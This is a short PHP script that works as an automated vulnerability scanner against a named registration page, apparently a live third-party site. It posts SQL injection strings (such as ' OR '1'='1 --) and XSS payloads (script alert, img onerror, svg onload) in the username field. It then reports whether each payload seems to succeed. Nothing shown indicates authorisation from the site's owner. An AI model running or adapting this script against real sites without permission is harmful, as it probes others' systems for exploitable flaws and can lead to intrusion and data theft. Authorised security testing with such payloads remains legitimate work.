<?php
// URL to test
$url = 'https://www.dataverify.com.ng/user_register.php';

// Payloads for testing
$vulnerabilities = [
    'SQL Injection' => [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' OR 1=1 #",
    ],
    'XSS' => [
        "<script>alert('XSS')</script>",
        "\"><img src=\"x\" onerror=\"alert('XSS')\">",
        "<svg/onload=alert('XSS')>",
    ],
];

// Function to send HTTP requests using cURL
function sendRequest($url, $method = 'POST', $data = [])
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    
    if ($method == 'POST' && !empty($data)) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    }

    $response = curl_exec($ch);
    
    if (curl_errno($ch)) {
        return false;
    }

    curl_close($ch);
    
    return $response;
}

// Function to test for vulnerabilities
function testVulnerabilities($url, $vulnerabilities)
{
    $results = [];
    
    foreach ($vulnerabilities as $type => $payloads) {
        foreach ($payloads as $payload) {
            $data = ['username' => $payload, 'password' => 'test']; // Adjust as needed
            $response = sendRequest($url, 'POST', $data);

            if ($response === false) {
                $results[] = "Error submitting form to $url.";
                continue;
            }

            // Check for SQL Injection
            if (strpos($response, 'SQL') !== false) {
                $results[] = "Potential SQL Injection detected with payload '$payload' at $url.";
            } else {
                $results[] = "SQL Injection seems secure with payload '$payload' at $url.";
            }

            // Check for XSS
            if (strpos($response, '<script>alert') !== false || strpos($response, '<svg') !== false) {
                $results[] = "Potential XSS vulnerability detected with payload '$payload' at $url.";
            } else {
                $results[] = "XSS seems secure with payload '$payload' at $url.";
            }
        }
    }

    return $results;
}

// Test the URL for vulnerabilities
$results = testVulnerabilities($url, $vulnerabilities);

// Display results
foreach ($results as $result) {
    echo $result . "<br>";
}
?>